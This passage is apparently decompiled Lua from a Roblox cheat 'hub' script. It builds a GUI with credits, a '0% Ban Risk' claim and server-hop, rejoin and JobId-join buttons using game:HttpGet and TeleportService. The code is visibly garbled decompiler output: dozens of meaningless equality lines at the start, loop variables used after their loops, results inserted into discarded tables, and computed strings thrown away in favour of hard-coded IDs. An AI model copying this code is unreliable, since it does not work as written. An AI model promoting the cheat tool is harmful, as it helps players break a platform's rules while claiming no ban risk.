    local _ = _97mzuHubUI_3 == r1245;
    local _ = _97mzuHubUI_3 == r1802;
    local _ = _97mzuHubUI_3 == r3527;
    local _ = _97mzuHubUI_3 == r848;
    local _ = _97mzuHubUI_3 == r2084;
    local _ = _97mzuHubUI_3 == r2225;
    local _ = _97mzuHubUI_3 == r3120;
    local _ = _97mzuHubUI_3 == Character;
    local _ = _97mzuHubUI_3 == Character;
    local _ = _97mzuHubUI_3 == Character;
    local _ = _97mzuHubUI_3 == Character;
    local _ = _97mzuHubUI_3 == Character;
    local _ = _97mzuHubUI_3 == Character;
    local _ = _97mzuHubUI_3 == r1899;
    local _ = _97mzuHubUI_3 == r2175;
    local _ = _97mzuHubUI_3 == r1678;
    local _ = _97mzuHubUI_3 == r3073;
    local _ = _97mzuHubUI_3 == r933;
    local _ = _97mzuHubUI_3 == UICorner_4;
    local _ = _97mzuHubUI_3 == r1359;
    local _ = _97mzuHubUI_3 == r3054;
    local _ = _97mzuHubUI_3 == r2955;
    local _ = _97mzuHubUI_3 == r2925;
    local _ = _97mzuHubUI_3 == r2736;
    local _ = _97mzuHubUI_3 == r2558;
    local _ = _97mzuHubUI_3 == r2672;
    local _ = _97mzuHubUI_3 == r2048;
    local _ = _97mzuHubUI_3 == r2711;
    local _ = _97mzuHubUI_3 == r2520;
    local _ = _97mzuHubUI_3 == r2577;
    local _ = _97mzuHubUI_3 == r1965;
    local _ = _97mzuHubUI_3 == r2257;
    local _ = _97mzuHubUI_3 == r896;
    local _ = _97mzuHubUI_3 == workspace;
    local _ = _97mzuHubUI_3 == r1874;
    local _ = _97mzuHubUI_3 == workspace.CurrentCamera;
    local _ = _97mzuHubUI_3 == r981;
    local _ = _97mzuHubUI_3 == r2386;
    local _ = _97mzuHubUI_3 == UICorner;
    local _ = _97mzuHubUI_3 == r2010;
    local _ = _97mzuHubUI_3 == r1284;
    local _ = _97mzuHubUI_3 == r3177;
    local _ = _97mzuHubUI_3 == r2501;
    local _ = _97mzuHubUI_3 == r1717;
    local _ = _97mzuHubUI_3 == r1016;
    local _ = _97mzuHubUI_3 == r580;
    local _ = _97mzuHubUI_3 == r688;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == LocalPlayer;
    local _ = _97mzuHubUI_3 == r838;
    local _ = _97mzuHubUI_3 == r2405;
    local _ = _97mzuHubUI_3 == r2115;
    local _ = _97mzuHubUI_3 == r1544;
    local _ = _97mzuHubUI_3 == r3338;
end);
local ScrollingFrame = Instance.new"ScrollingFrame";
ScrollingFrame.Size = UDim2_New(0, 150, 1, -86);
ScrollingFrame.Position = UDim2_New(0, 0, 0, 36);
ScrollingFrame.BackgroundColor3 = R294_Result_2;
ScrollingFrame.BorderSizePixel = 0;
ScrollingFrame.ScrollBarThickness = 2;
ScrollingFrame.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame.Visible = false;
ScrollingFrame.Parent = Frame;
local UIListLayout = Instance.new"UIListLayout";
UIListLayout.Padding = UDim_New(0, 2);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout.Parent = ScrollingFrame;
local UIPadding = Instance.new"UIPadding";
UIPadding.PaddingTop = UDim_New(0, 6);
UIPadding.PaddingRight = UDim_New(0, 4);
UIPadding.Parent = ScrollingFrame;
local Frame_3 = Instance.new"Frame";
Frame_3.Size = UDim2_New(1, -150, 1, -86);
Frame_3.Position = UDim2_New(0, 150, 0, 36);
Frame_3.BackgroundTransparency = 1;
Frame_3.Visible = false;
Frame_3.Parent = Frame;
local Frame_4 = Instance.new"Frame";
Frame_4.Size = UDim2_New(1, 0, 1, -86);
Frame_4.Position = UDim2_New(0, 0, 0, 36);
Frame_4.BackgroundTransparency = 1;
Frame_4.Visible = true;
Frame_4.Parent = Frame;
local Frame_5 = Instance.new"Frame";
Frame_5.Size = UDim2_New(1, 0, 1, 0);
Frame_5.BackgroundTransparency = 1;
Frame_5.Visible = false;
Frame_5.Parent = Frame_4;
local ScrollingFrame_2 = Instance.new"ScrollingFrame";
ScrollingFrame_2.Size = UDim2_New(1, -12, 1, -10);
ScrollingFrame_2.Position = UDim2_New(0, 6, 0, 5);
ScrollingFrame_2.BackgroundTransparency = 1;
ScrollingFrame_2.ScrollBarThickness = 0;
ScrollingFrame_2.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame_2.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame_2.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame_2.Parent = Frame_5;
local UIListLayout_2 = Instance.new"UIListLayout";
UIListLayout_2.Padding = UDim_New(0, 8);
UIListLayout_2.Parent = ScrollingFrame_2;
Frame_5.Visible = true;
local ScrollingFrame_3 = Instance.new"ScrollingFrame";
ScrollingFrame_3.Size = UDim2_New(0.5, -8, 1, -10);
ScrollingFrame_3.Position = UDim2_New(0.5, 2, 0, 5);
ScrollingFrame_3.BackgroundTransparency = 1;
ScrollingFrame_3.ScrollBarThickness = 0;
ScrollingFrame_3.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame_3.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame_3.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame_3.Parent = Frame_5;
ScrollingFrame_2.Size = UDim2_New(0.5, -8, 1, -10);
local UIListLayout_3 = Instance.new"UIListLayout";
UIListLayout_3.Padding = UDim_New(0, 8);
UIListLayout_3.Parent = ScrollingFrame_3;
local Frame_6 = Instance.new"Frame";
Frame_6.Size = UDim2_New(1, 0, 0, 155);
Frame_6.BackgroundColor3 = R294_Result_3;
Frame_6.BorderSizePixel = 0;
Frame_6.Parent = ScrollingFrame_2;
r547 = Instance.new("UICorner", Frame_6);
r547.CornerRadius = UDim_New(0, 6);
local UIStroke = Instance.new"UIStroke";
UIStroke.Color = R294_Result_4;
UIStroke.Parent = Frame_6;
local ImageLabel_3 = Instance.new"ImageLabel";
ImageLabel_3.Size = UDim2_New(0, 90, 0, 90);
ImageLabel_3.Position = UDim2_New(0.5, -45, 0, 15);
ImageLabel_3.BackgroundTransparency = 1;
local _ = UserId .. "&width=420&height=420&format=png";
ImageLabel_3.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=931109&width=420&height=420&format=png";
ImageLabel_3.Parent = Frame_6;
r557 = Instance.new("UICorner", ImageLabel_3);
r557.CornerRadius = UDim_New(0, 45);
local TextLabel_2 = Instance.new"TextLabel";
TextLabel_2.Size = UDim2_New(1, -20, 0, 18);
TextLabel_2.Position = UDim2_New(0, 10, 0, 115);
TextLabel_2.BackgroundTransparency = 1;
TextLabel_2.Text = Name;
TextLabel_2.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
TextLabel_2.Font = Enum.Font.GothamBold;
TextLabel_2.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Center;
TextLabel_2.Parent = Frame_6;
local qwvdmrxq = Instance.new"TextLabel";
qwvdmrxq.Size = UDim2_New(1, -20, 0, 16);
qwvdmrxq.Position = UDim2_New(0, 10, 0, 133);
qwvdmrxq.BackgroundTransparency = 1;
local _ = "@" .. DisplayName;
qwvdmrxq.Text = "@qwvdmrxq";
qwvdmrxq.TextColor3 = R294_Result_7;
qwvdmrxq.Font = Enum.Font.GothamBold;
qwvdmrxq.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
qwvdmrxq.TextXAlignment = Enum.TextXAlignment.Center;
qwvdmrxq.Parent = Frame_6;
local Frame_7 = Instance.new"Frame";
Frame_7.Size = UDim2_New(1, 0, 0, 55);
Frame_7.BackgroundColor3 = R294_Result_3;
Frame_7.BorderSizePixel = 0;
Frame_7.Parent = ScrollingFrame_3;
r580 = Instance.new("UICorner", Frame_7);
r580.CornerRadius = UDim_New(0, 6);
local UIStroke_2 = Instance.new"UIStroke";
UIStroke_2.Color = R294_Result_4;
UIStroke_2.Parent = Frame_7;
local Information = Instance.new"TextLabel";
Information.Size = UDim2_New(1, -16, 0, 45);
Information.Position = UDim2_New(0, 8, 0, -10);
Information.BackgroundTransparency = 1;
Information.Text = "Information";
Information.TextColor3 = R294_Result_6;
Information.Font = Enum.Font.GothamBold;
Information.TextSize = 11;
Information.TextWrapped = true;
local _ = Enum.TextXAlignment.Left;
Information.TextXAlignment = Enum.TextXAlignment.Left;
Information.Parent = Frame_7;
local TextLabel_3 = Instance.new"TextLabel";
TextLabel_3.Size = UDim2_New(1, -16, 0, 45);
TextLabel_3.Position = UDim2_New(0, 8, 0, 8);
TextLabel_3.BackgroundTransparency = 1;
TextLabel_3.Text = "\nKey: NO KEY\nDiscord: https://(discord invite)\nMade By 97mzu Goat";
TextLabel_3.TextColor3 = R294_Result_7;
TextLabel_3.Font = Enum.Font.GothamBold;
TextLabel_3.TextSize = 11;
TextLabel_3.TextWrapped = true;
local _ = Enum.TextXAlignment.Left;
TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left;
TextLabel_3.Parent = Frame_7;
local Frame_8 = Instance.new"Frame";
Frame_8.Size = UDim2_New(1, 0, 0, 65);
Frame_8.BackgroundColor3 = R294_Result_3;
Frame_8.BorderSizePixel = 0;
Frame_8.Parent = ScrollingFrame_3;
r601 = Instance.new("UICorner", Frame_8);
r601.CornerRadius = UDim_New(0, 6);
local UIStroke_3 = Instance.new"UIStroke";
UIStroke_3.Color = R294_Result_4;
UIStroke_3.Parent = Frame_8;
local License = Instance.new"TextLabel";
License.Size = UDim2_New(1, -16, 0, 20);
License.Position = UDim2_New(0, 8, 0, 5);
License.BackgroundTransparency = 1;
License.Text = "License";
License.TextColor3 = R294_Result_6;
License.Font = Enum.Font.GothamBold;
License.TextSize = 11;
License.TextWrapped = true;
local _ = Enum.TextXAlignment.Left;
License.TextXAlignment = Enum.TextXAlignment.Left;
License.Parent = Frame_8;
local TextLabel_4 = Instance.new"TextLabel";
TextLabel_4.Size = UDim2_New(1, -16, 0, 55);
TextLabel_4.Position = UDim2_New(0, 8, 0, 5);
TextLabel_4.BackgroundTransparency = 1;
TextLabel_4.Text = "\nThis script was made for free for mobile users; computers have a better version\nand better experience / perfomance";
TextLabel_4.TextColor3 = R294_Result_7;
TextLabel_4.Font = Enum.Font.GothamBold;
TextLabel_4.TextSize = 11;
TextLabel_4.TextWrapped = true;
local _ = Enum.TextXAlignment.Left;
TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left;
TextLabel_4.Parent = Frame_8;
local Frame_9 = Instance.new"Frame";
Frame_9.Size = UDim2_New(1, 0, 1, 0);
Frame_9.BackgroundTransparency = 1;
Frame_9.Visible = false;
Frame_9.Parent = Frame_4;
local ScrollingFrame_4 = Instance.new"ScrollingFrame";
ScrollingFrame_4.Size = UDim2_New(1, -12, 1, -10);
ScrollingFrame_4.Position = UDim2_New(0, 6, 0, 5);
ScrollingFrame_4.BackgroundTransparency = 1;
ScrollingFrame_4.ScrollBarThickness = 0;
ScrollingFrame_4.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame_4.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame_4.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame_4.Parent = Frame_9;
local UIListLayout_4 = Instance.new"UIListLayout";
UIListLayout_4.Padding = UDim_New(0, 8);
UIListLayout_4.Parent = ScrollingFrame_4;
local ScrollingFrame_5 = Instance.new"ScrollingFrame";
ScrollingFrame_5.Size = UDim2_New(0.5, -8, 1, -10);
ScrollingFrame_5.Position = UDim2_New(0.5, 2, 0, 5);
ScrollingFrame_5.BackgroundTransparency = 1;
ScrollingFrame_5.ScrollBarThickness = 0;
ScrollingFrame_5.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame_5.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame_5.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame_5.Parent = Frame_9;
ScrollingFrame_4.Size = UDim2_New(0.5, -8, 1, -10);
local UIListLayout_5 = Instance.new"UIListLayout";
UIListLayout_5.Padding = UDim_New(0, 8);
UIListLayout_5.Parent = ScrollingFrame_5;
local Frame_10 = Instance.new"Frame";
Frame_10.Size = UDim2_New(1, 0, 0, 185);
Frame_10.BackgroundColor3 = R294_Result_3;
Frame_10.BorderSizePixel = 0;
Frame_10.Parent = ScrollingFrame_4;
r651 = Instance.new("UICorner", Frame_10);
r651.CornerRadius = UDim_New(0, 6);
local UIStroke_4 = Instance.new"UIStroke";
UIStroke_4.Color = R294_Result_4;
UIStroke_4.Parent = Frame_10;
local ImageLabel_4 = Instance.new"ImageLabel";
ImageLabel_4.Size = UDim2_New(0, 90, 0, 90);
ImageLabel_4.Position = UDim2_New(0.5, -45, 0, 32);
ImageLabel_4.BackgroundTransparency = 1;
local success_6, Pcall_Result = pcall(function(a_13, b_13, c_13)
    return MarketplaceService:GetProductInfo(PlaceId);
end);
ImageLabel_4.Image = "rbxassetid://" .. tostring(Pcall_Result.IconImageAssetId);
ImageLabel_4.Parent = Frame_10;
r667 = Instance.new("UICorner", ImageLabel_4);
r667.CornerRadius = UDim_New(0, 8);
local TextLabel_5 = Instance.new"TextLabel";
TextLabel_5.Size = UDim2_New(1, -16, 0, 50);
TextLabel_5.Position = UDim2_New(0, 8, 0, 128);
TextLabel_5.BackgroundTransparency = 1;
local _ = PlaceId .. ")\n#v-1.97";
TextLabel_5.Text = Pcall_Result.Name .. (
    "\n(By: " .. (
        Pcall_Result.Creator.Name .. ")\n(ID: 450852)\n#v-1.97"
    )
);
TextLabel_5.TextColor3 = R294_Result_7;
TextLabel_5.Font = Enum.Font.GothamBold;
TextLabel_5.TextSize = 10;
TextLabel_5.TextWrapped = true;
local _ = Enum.TextXAlignment.Center;
TextLabel_5.TextXAlignment = Enum.TextXAlignment.Center;
TextLabel_5.Parent = Frame_10;
local Frame_11 = Instance.new"Frame";
Frame_11.Size = UDim2_New(1, 0, 0, 100);
Frame_11.BackgroundColor3 = R294_Result_3;
Frame_11.BorderSizePixel = 0;
Frame_11.Parent = ScrollingFrame_4;
r688 = Instance.new("UICorner", Frame_11);
r688.CornerRadius = UDim_New(0, 6);
local UIStroke_5 = Instance.new"UIStroke";
UIStroke_5.Color = R294_Result_4;
UIStroke_5.Parent = Frame_11;
local UIGridLayout = Instance.new"UIGridLayout";
UIGridLayout.CellSize = UDim2_New(0.5, -8, 0, 38);
UIGridLayout.CellPadding = UDim2_New(0, 8, 0, 6);
local _ = Enum.SortOrder.LayoutOrder;
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder;
UIGridLayout.Parent = Frame_11;
local UIPadding_2 = Instance.new"UIPadding";
UIPadding_2.PaddingTop = UDim_New(0, 10);
UIPadding_2.PaddingBottom = UDim_New(0, 10);
UIPadding_2.PaddingLeft = UDim_New(0, 12);
UIPadding_2.PaddingRight = UDim_New(0, 12);
UIPadding_2.Parent = Frame_11;
local Frame_12 = Instance.new"Frame";
Frame_12.BackgroundTransparency = 1;
Frame_12.Parent = Frame_11;
local Ban_Risk = Instance.new"TextLabel";
Ban_Risk.Size = UDim2_New(1, 0, 0, 18);
Ban_Risk.Position = UDim2_New(0, 0, 0, 0);
Ban_Risk.BackgroundTransparency = 1;
Ban_Risk.Text = "Ban Risk";
Ban_Risk.TextColor3 = R294_Result_6;
Ban_Risk.TextTransparency = 0;
Ban_Risk.Font = Enum.Font.GothamBold;
Ban_Risk.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Ban_Risk.TextXAlignment = Enum.TextXAlignment.Left;
Ban_Risk.Parent = Frame_12;
local _0_Regex = Instance.new"TextLabel";
_0_Regex.Size = UDim2_New(1, 0, 0, 14);
_0_Regex.Position = UDim2_New(0, 0, 0, 18);
_0_Regex.BackgroundTransparency = 1;
_0_Regex.Text = "0% Ban Risk";
_0_Regex.TextColor3 = R294_Result_7;
_0_Regex.TextTransparency = 0;
local _ = Enum.Font.Gotham;
_0_Regex.Font = Enum.Font.Gotham;
_0_Regex.TextSize = 10;
local _ = Enum.TextXAlignment.Left;
_0_Regex.TextXAlignment = Enum.TextXAlignment.Left;
_0_Regex.Parent = Frame_12;
local Frame_13 = Instance.new"Frame";
Frame_13.BackgroundTransparency = 1;
Frame_13.Parent = Frame_11;
local SupportS_Script = Instance.new"TextLabel";
SupportS_Script.Size = UDim2_New(1, 0, 0, 18);
SupportS_Script.Position = UDim2_New(0, 0, 0, 0);
SupportS_Script.BackgroundTransparency = 1;
SupportS_Script.Text = "Support's Script?";
SupportS_Script.TextColor3 = R294_Result_6;
SupportS_Script.TextTransparency = 0;
SupportS_Script.Font = Enum.Font.GothamBold;
SupportS_Script.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
SupportS_Script.TextXAlignment = Enum.TextXAlignment.Left;
SupportS_Script.Parent = Frame_13;
local Fully_Supported = Instance.new"TextLabel";
Fully_Supported.Size = UDim2_New(1, 0, 0, 14);
Fully_Supported.Position = UDim2_New(0, 0, 0, 18);
Fully_Supported.BackgroundTransparency = 1;
Fully_Supported.Text = "Fully Supported";
Fully_Supported.TextColor3 = R294_Result_7;
Fully_Supported.TextTransparency = 0;
local _ = Enum.Font.Gotham;
Fully_Supported.Font = Enum.Font.Gotham;
Fully_Supported.TextSize = 10;
local _ = Enum.TextXAlignment.Left;
Fully_Supported.TextXAlignment = Enum.TextXAlignment.Left;
Fully_Supported.Parent = Frame_13;
local Frame_14 = Instance.new"Frame";
Frame_14.BackgroundTransparency = 1;
Frame_14.Parent = Frame_11;
local Modules_Loaded = Instance.new"TextLabel";
Modules_Loaded.Size = UDim2_New(1, 0, 0, 18);
Modules_Loaded.Position = UDim2_New(0, 0, 0, 0);
Modules_Loaded.BackgroundTransparency = 1;
Modules_Loaded.Text = "Modules loaded?";
Modules_Loaded.TextColor3 = R294_Result_6;
Modules_Loaded.TextTransparency = 0;
Modules_Loaded.Font = Enum.Font.GothamBold;
Modules_Loaded.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Modules_Loaded.TextXAlignment = Enum.TextXAlignment.Left;
Modules_Loaded.Parent = Frame_14;
local Yes_Regex = Instance.new"TextLabel";
Yes_Regex.Size = UDim2_New(1, 0, 0, 14);
Yes_Regex.Position = UDim2_New(0, 0, 0, 18);
Yes_Regex.BackgroundTransparency = 1;
Yes_Regex.Text = "Yes All Modules Detected [ 3 ]";
Yes_Regex.TextColor3 = R294_Result_7;
Yes_Regex.TextTransparency = 0;
local _ = Enum.Font.Gotham;
Yes_Regex.Font = Enum.Font.Gotham;
Yes_Regex.TextSize = 10;
local _ = Enum.TextXAlignment.Left;
Yes_Regex.TextXAlignment = Enum.TextXAlignment.Left;
Yes_Regex.Parent = Frame_14;
local Frame_15 = Instance.new"Frame";
Frame_15.BackgroundTransparency = 1;
Frame_15.Parent = Frame_11;
local Status_Script = Instance.new"TextLabel";
Status_Script.Size = UDim2_New(1, 0, 0, 18);
Status_Script.Position = UDim2_New(0, 0, 0, 0);
Status_Script.BackgroundTransparency = 1;
Status_Script.Text = "Status Script";
Status_Script.TextColor3 = R294_Result_6;
Status_Script.TextTransparency = 0;
Status_Script.Font = Enum.Font.GothamBold;
Status_Script.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Status_Script.TextXAlignment = Enum.TextXAlignment.Left;
Status_Script.Parent = Frame_15;
local Working = Instance.new"TextLabel";
Working.Size = UDim2_New(1, 0, 0, 14);
Working.Position = UDim2_New(0, 0, 0, 18);
Working.BackgroundTransparency = 1;
Working.Text = "Working";
Working.TextColor3 = R294_Result_7;
Working.TextTransparency = 0;
local _ = Enum.Font.Gotham;
Working.Font = Enum.Font.Gotham;
Working.TextSize = 10;
local _ = Enum.TextXAlignment.Left;
Working.TextXAlignment = Enum.TextXAlignment.Left;
Working.Parent = Frame_15;
local Frame_16 = Instance.new"Frame";
Frame_16.Size = UDim2_New(1, 0, 0, 116);
Frame_16.BackgroundColor3 = R294_Result_3;
Frame_16.BorderSizePixel = 0;
Frame_16.Parent = ScrollingFrame_5;
r779 = Instance.new("UICorner", Frame_16);
r779.CornerRadius = UDim_New(0, 6);
local UIStroke_6 = Instance.new"UIStroke";
UIStroke_6.Color = R294_Result_4;
UIStroke_6.Parent = Frame_16;
local Server = Instance.new"TextLabel";
Server.Size = UDim2_New(1, -16, 0, 26);
Server.Position = UDim2_New(0, 8, 0, 4);
Server.BackgroundTransparency = 1;
Server.Text = "Server";
Server.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Server.Font = Enum.Font.GothamBold;
Server.TextSize = 10;
local _ = Enum.TextXAlignment.Left;
Server.TextXAlignment = Enum.TextXAlignment.Left;
Server.Parent = Frame_16;
local Frame_17 = Instance.new"Frame";
Frame_17.Size = UDim2_New(1, 0, 1, -30);
Frame_17.Position = UDim2_New(0, 0, 0, 30);
Frame_17.BackgroundTransparency = 1;
Frame_17.Parent = Frame_16;
local UIListLayout_6 = Instance.new"UIListLayout";
UIListLayout_6.Padding = UDim_New(0, 6);
local _ = Enum.HorizontalAlignment.Center;
UIListLayout_6.HorizontalAlignment = Enum.HorizontalAlignment.Center;
UIListLayout_6.Parent = Frame_17;
local UIPadding_3 = Instance.new"UIPadding";
UIPadding_3.PaddingLeft = UDim_New(0, 8);
UIPadding_3.PaddingRight = UDim_New(0, 8);
UIPadding_3.PaddingBottom = UDim_New(0, 8);
UIPadding_3.Parent = Frame_17;
local Hop_Server_New_Server = Instance.new"TextButton";
Hop_Server_New_Server.Size = UDim2_New(1, 0, 0, 24);
Hop_Server_New_Server.BackgroundColor3 = FromRGB(27, 27, 27);
Hop_Server_New_Server.AutoButtonColor = false;
Hop_Server_New_Server.Text = "Hop Server (New Server)";
Hop_Server_New_Server.TextColor3 = R294_Result_6;
Hop_Server_New_Server.Font = Enum.Font.GothamBold;
Hop_Server_New_Server.TextSize = 9;
Hop_Server_New_Server.Parent = Frame_17;
r814 = Instance.new("UICorner", Hop_Server_New_Server);
r814.CornerRadius = UDim_New(0, 4);
local UIStroke_7 = Instance.new"UIStroke";
UIStroke_7.Color = R294_Result_4;
UIStroke_7.Parent = Hop_Server_New_Server;
Hop_Server_New_Server.MouseButton1Click:Connect(function(a_25, b_25, c_25)
    success_7, Pcall_Result_2 = pcall(function(a_26, b_26, c_26)
        game:GetService("HttpService");
        local _ = PlaceId .. "Public?sortOrder=Asc&limit=100";
        return HttpService:JSONDecode(
            game:HttpGet("https://games.roblox.com/v1/games/450852/servers/Public?sortOrder=Asc&limit=100")
        );
    end);
    for for_key_8, for_val_8 in ipairs(Pcall_Result_2.data) do
        local _ = for_val_8.id == JobId;
        local _ = for_val_8.playing < for_val_8.maxPlayers;
        table.insert({}, for_val_8);
    end;
    TeleportService = game:GetService("TeleportService");
    TeleportService:TeleportToPlaceInstance(PlaceId, for_val_8.id, LocalPlayer);
end);
local Hop_Server_Old_Server = Instance.new"TextButton";
Hop_Server_Old_Server.Size = UDim2_New(1, 0, 0, 24);
Hop_Server_Old_Server.BackgroundColor3 = FromRGB(27, 27, 27);
Hop_Server_Old_Server.AutoButtonColor = false;
Hop_Server_Old_Server.Text = "Hop Server (Old Server)";
Hop_Server_Old_Server.TextColor3 = R294_Result_6;
Hop_Server_Old_Server.Font = Enum.Font.GothamBold;
Hop_Server_Old_Server.TextSize = 9;
Hop_Server_Old_Server.Parent = Frame_17;
r826 = Instance.new("UICorner", Hop_Server_Old_Server);
r826.CornerRadius = UDim_New(0, 4);
local UIStroke_8 = Instance.new"UIStroke";
UIStroke_8.Color = R294_Result_4;
UIStroke_8.Parent = Hop_Server_Old_Server;
Hop_Server_Old_Server.MouseButton1Click:Connect(function(a_27, b_27, c_27)
    success_8, Pcall_Result_3 = pcall(function(a_28, b_28, c_28)
        game:GetService("HttpService");
        local _ = PlaceId .. "Public?sortOrder=Desc&limit=100";
        return HttpService:JSONDecode(
            game:HttpGet("https://games.roblox.com/v1/games/450852/servers/Public?sortOrder=Desc&limit=100")
        );
    end);
    for for_key_9, for_val_9 in ipairs(Pcall_Result_3.data) do
        local _ = for_val_9.id == JobId;
        local _ = for_val_9.playing < for_val_9.maxPlayers;
        table.insert({}, for_val_9);
    end;
    game:GetService("TeleportService");
    TeleportService:TeleportToPlaceInstance(PlaceId, for_val_9.id, LocalPlayer);
end);
local Rejoin_Server = Instance.new"TextButton";
Rejoin_Server.Size = UDim2_New(1, 0, 0, 24);
Rejoin_Server.BackgroundColor3 = FromRGB(27, 27, 27);
Rejoin_Server.AutoButtonColor = false;
Rejoin_Server.Text = "Rejoin Server";
Rejoin_Server.TextColor3 = R294_Result_6;
Rejoin_Server.Font = Enum.Font.GothamBold;
Rejoin_Server.TextSize = 9;
Rejoin_Server.Parent = Frame_17;
r838 = Instance.new("UICorner", Rejoin_Server);
r838.CornerRadius = UDim_New(0, 4);
local UIStroke_9 = Instance.new"UIStroke";
UIStroke_9.Color = R294_Result_4;
UIStroke_9.Parent = Rejoin_Server;
Rejoin_Server.MouseButton1Click:Connect(function(a_29, b_29, c_29)
    game:GetService("TeleportService");
    TeleportService:TeleportToPlaceInstance(PlaceId, JobId, LocalPlayer);
end);
local Frame_18 = Instance.new"Frame";
Frame_18.Size = UDim2_New(1, 0, 0, 116);
Frame_18.BackgroundColor3 = R294_Result_3;
Frame_18.BorderSizePixel = 0;
Frame_18.Parent = ScrollingFrame_5;
r848 = Instance.new("UICorner", Frame_18);
r848.CornerRadius = UDim_New(0, 6);
local UIStroke_10 = Instance.new"UIStroke";
UIStroke_10.Color = R294_Result_4;
UIStroke_10.Parent = Frame_18;
local JobId_2 = Instance.new"TextLabel";
JobId_2.Size = UDim2_New(1, -16, 0, 26);
JobId_2.Position = UDim2_New(0, 8, 0, 4);
JobId_2.BackgroundTransparency = 1;
JobId_2.Text = "JobId";
JobId_2.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
JobId_2.Font = Enum.Font.GothamBold;
JobId_2.TextSize = 10;
local _ = Enum.TextXAlignment.Left;
JobId_2.TextXAlignment = Enum.TextXAlignment.Left;
JobId_2.Parent = Frame_18;
local Frame_19 = Instance.new"Frame";
Frame_19.Size = UDim2_New(1, 0, 1, -30);
Frame_19.Position = UDim2_New(0, 0, 0, 30);
Frame_19.BackgroundTransparency = 1;
Frame_19.Parent = Frame_18;
local UIListLayout_7 = Instance.new"UIListLayout";
UIListLayout_7.Padding = UDim_New(0, 6);
local _ = Enum.HorizontalAlignment.Center;
UIListLayout_7.HorizontalAlignment = Enum.HorizontalAlignment.Center;
UIListLayout_7.Parent = Frame_19;
local UIPadding_4 = Instance.new"UIPadding";
UIPadding_4.PaddingLeft = UDim_New(0, 8);
UIPadding_4.PaddingRight = UDim_New(0, 8);
UIPadding_4.PaddingBottom = UDim_New(0, 8);
UIPadding_4.Parent = Frame_19;
local TextBox = Instance.new"TextBox";
TextBox.Size = UDim2_New(1, 0, 0, 24);
TextBox.BackgroundColor3 = FromRGB(27, 27, 27);
TextBox.PlaceholderText = "Paste Jobid here...";
TextBox.PlaceholderColor3 = R294_Result_7;
TextBox.Text = "";
TextBox.TextColor3 = R294_Result_6;
TextBox.Font = Enum.Font.GothamBold;
TextBox.TextSize = 9;
TextBox.ClearTextOnFocus = false;
TextBox.Parent = Frame_19;
r883 = Instance.new("UICorner", TextBox);
r883.CornerRadius = UDim_New(0, 4);
local UIStroke_11 = Instance.new"UIStroke";
UIStroke_11.Color = R294_Result_4;
UIStroke_11.Parent = TextBox;
TextBox:GetPropertyChangedSignal("Text"):Connect(function(a_30, b_30, c_30)

end);
local Join_Server_JobId = Instance.new"TextButton";
Join_Server_JobId.Size = UDim2_New(1, 0, 0, 24);
Join_Server_JobId.BackgroundColor3 = FromRGB(27, 27, 27);
Join_Server_JobId.AutoButtonColor = false;
Join_Server_JobId.Text = "Join Server JobId";
Join_Server_JobId.TextColor3 = R294_Result_6;
Join_Server_JobId.Font = Enum.Font.GothamBold;
Join_Server_JobId.TextSize = 9;
Join_Server_JobId.Parent = Frame_19;
r896 = Instance.new("UICorner", Join_Server_JobId);
r896.CornerRadius = UDim_New(0, 4);
local UIStroke_12 = Instance.new"UIStroke";
UIStroke_12.Color = R294_Result_4;
UIStroke_12.Parent = Join_Server_JobId;
Join_Server_JobId.MouseButton1Click:Connect(function(a_31, b_31, c_31)
    game:GetService("TeleportService");
